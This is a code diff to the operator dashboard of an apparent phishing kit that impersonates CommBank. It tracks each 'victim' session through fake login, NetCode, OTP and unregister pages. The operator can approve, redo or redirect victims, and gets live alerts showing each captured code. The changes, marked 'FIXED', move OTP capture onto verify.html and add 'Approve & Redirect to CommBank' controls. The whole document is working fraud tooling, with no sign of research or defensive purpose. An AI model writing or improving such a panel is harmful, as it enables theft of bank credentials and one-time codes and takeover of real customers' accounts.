@@ -444,13 +444,16 @@
     function statusText(s){
       if (s.page==='success' || s.status==='approved') return '<div style="font-size:11px;color:var(--green)">APPROVED ✓</div>';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">CREDENTIALS ENTERED</div>';
+      // FIXED: Check for OTP on verify.html (since that's now the OTP page)
+      if (s.page==='verify.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">OTP ENTERED</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--yellow)">NETCODE ENTERED</div>';
       if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">UNREGISTER CLICKED</div>';
+      // Legacy otp.html support
       if (s.page==='otp.html' && s.otp) return '<div style="font-size:11px;color:var(--green)">OTP ENTERED</div>';
       return '<div style="font-size:11px;color:var(--text-muted)">WAITING</div>';
     }
 
-    /* ----------  ACTIONS  ---------- */
+    /* ----------  ACTIONS - FIXED FOR VERIFY.HTML OTP FLOW ---------- */
     function actionButtons(s){
       let html = '<div style="display:flex;gap:6px">';
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
@@ -460,8 +463,14 @@
       if (s.page === 'index.html' && s.entered) {
         html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to Verify"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo Credentials"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      } else if (s.page === 'verify.html' && s.phone) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue to Unregister"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+      } 
+      // FIXED: Check for OTP on verify.html and show redo/continue buttons
+      else if (s.page === 'verify.html' && s.otp) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Approve & Redirect to CommBank"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo OTP"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+      }
+      else if (s.page === 'verify.html' && s.phone) {
+        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
         html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo NetCode"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
       } else if (s.page === 'unregister.html') {
         if (s.unregisterClicked) {
@@ -501,7 +510,8 @@
             showAlert('info', 'NETCODE ENTERED', `Code: ${s.phone}`, s.victimNum);
           if (!old.unregisterClicked && s.unregisterClicked) 
             showAlert('warning', 'UNREGISTER CLICKED', 'Victim proceeded to unregister', s.victimNum);
-          if (!old.otp && s.otp) 
+          // FIXED: Check for OTP on verify.html too
+          if ((!old.otp && s.otp) || (s.page === 'verify.html' && !old.otp && s.otp)) 
             showAlert('success', 'OTP ENTERED', `Code: ${s.otp}`, s.victimNum);
           if ((old.page !== 'success' && s.page === 'success') || (old.status !== 'approved' && s.status === 'approved')) {
             showAlert('success', 'LOGIN APPROVED', 'Victim completed full flow', s.victimNum);
@@ -517,7 +527,7 @@
       if (f === 'success') return 'APPROVED ✓';
       switch(f){
         case 'index.html': return 'LOGIN';
-        case 'verify.html': return 'NETCODE';
+        case 'verify.html': return 'NETCODE/OTP';
         case 'unregister.html': return 'UNREGISTER';
         case 'otp.html': return 'OTP';
         default: return f;
@@ -556,9 +566,9 @@
         
         const approved = isApproved(mergedSession);
         
-        // Build NetCode value: prioritize OTP if on otp.html, then phone, then stored value
+        // Build NetCode value: prioritize OTP if on verify.html, then phone, then stored value
         let netcodeValue = '—';
-        if (mergedSession.page === 'otp.html' && mergedSession.otp) {
+        if (mergedSession.page === 'verify.html' && mergedSession.otp) {
           netcodeValue = mergedSession.otp;
         } else if (mergedSession.phone) {
           netcodeValue = mergedSession.phone;
@@ -618,14 +628,15 @@
       let netcodeValue = '—';
       let netcodeLabel = 'NetCode';
       
-      if (s.page === 'otp.html' && s.otp) {
+      // FIXED: Check verify.html for OTP
+      if (s.page === 'verify.html' && s.otp) {
         netcodeValue = s.otp;
-        netcodeLabel = 'NetCode (OTP)';
+        netcodeLabel = 'OTP (verify.html)';
       } else if (s.phone) {
         netcodeValue = s.phone;
       } else if (persistentData.otp) {
         netcodeValue = persistentData.otp;
-        netcodeLabel = 'NetCode (OTP)';
+        netcodeLabel = 'OTP';
       } else if (persistentData.phone) {
         netcodeValue = persistentData.phone;
       }
